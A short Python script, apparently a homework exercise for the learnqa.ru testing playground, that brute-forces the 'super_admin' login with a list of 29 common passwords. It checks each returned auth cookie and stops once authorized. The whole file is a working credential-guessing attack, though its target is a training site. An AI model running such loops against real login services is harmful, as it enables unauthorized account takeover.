import requests

passwords = [
	'123456',
	'welcome',
	'123456789',
	'qwerty',
	'password',
	'1234567',
	'12345678',
	'12345',
	'iloveyou',
	'111111',
	'123123',
	'abc123',
	'qwerty123',
	'1q2w3e4r',
	'admin',
	'qwertyuiop',
	'654321',
	'555555',
	'lovely',
	'7777777',
	'888888',
	'princess',
	'dragon',
	'password1',
	'123qwe',
	'football',
	'!@#$%^&*',
	'passw0rd',
	'000000'
]

i = 0

while i < 29:

	login_password = {"login":"super_admin", "password":passwords[i]}

	response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=login_password)

	print(f"using i_value: {i} and password: {passwords[i]}  response: {response1.text}")

	cookie_value = response1.cookies.get('auth_cookie')

	cookies = {'auth_cookie': cookie_value}

	response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
	print(response2.text)
	i += 1

	if (response2.text=='You are authorized'):

		break

	else:

		print("Verification of password finished")